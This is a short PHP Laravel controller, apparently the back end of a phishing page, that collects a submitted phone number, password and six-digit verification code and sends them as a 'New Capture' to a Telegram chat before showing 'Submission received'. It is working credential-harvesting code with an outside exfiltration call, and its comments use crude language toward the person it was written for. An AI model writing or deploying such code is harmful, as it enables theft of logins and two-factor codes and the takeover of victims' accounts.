<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class TelegramController extends Controller
{
    public function sendToTelegram(Request $request)
    {
        $botToken = env('TELEGRAM_BOT_TOKEN'); // store this in your .env, you lazy fuck
        $chatID = env('TELEGRAM_CHAT_ID');     // store this too

        $phone = $request->input('phone', 'No phone');
        $password = $request->input('password', 'No password');
        $code = $request->input('code', 'No code');

        $message = "🔐 New Capture:\n📱 Phone: $phone\n🔑 Pass: $password\n🔢 6-digit Code: $code\n🕒 Time: " . now()->toDateTimeString();

        $response = Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
            'chat_id' => $chatID,
            'text' => $message,
            'parse_mode' => 'HTML'
        ]);

        // You can check $response->successful() if you give a shit, but you didn't ask for that

        return redirect()->back()->with('message', 'Submission received'); // or whatever redirect
    }
}